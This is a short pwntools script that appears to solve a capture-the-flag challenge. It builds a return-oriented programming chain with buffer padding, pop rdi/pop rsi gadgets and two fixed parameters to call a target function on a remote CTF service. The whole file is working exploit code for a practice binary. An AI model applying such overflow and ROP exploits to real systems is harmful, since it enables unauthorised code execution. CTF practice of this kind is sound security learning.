from pwn import *

r = remote('ctf99.cs.ui.ac.id', 9132)

target = 0x0000000000401176
param1 = 0x1234567890abcdef
param2 = 0xfedcba0987654321
pop_rdi = 0x00000000004012f3 # for 1st param  pop rdi ; ret 
pop_rsi = 0x00000000004012f1 # for 2nd param  pop rsi ; pop r15 ; ret 

payload = 'A'*16
payload += p64(pop_rdi)
payload += p64(param1)
payload += p64(pop_rsi)
payload += p64(param2)
payload += p64(param2)
payload += p64(target)


print(r.recvline())
r.sendline(payload)
print(r.recvline())


with open('payload', 'wb') as out:
	out.write(payload)
# pause()
# r.interactive()
